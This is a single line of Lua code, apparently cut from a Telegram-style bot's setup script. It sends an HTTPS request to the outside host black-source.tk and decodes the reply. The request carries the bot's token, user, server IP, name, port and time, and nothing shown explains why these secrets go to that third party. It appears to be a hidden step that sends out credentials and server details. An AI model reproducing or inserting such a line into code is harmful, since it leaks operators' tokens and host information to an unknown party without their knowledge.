...
local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=DRAGON&id='..SUDO.."&token="..token.."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
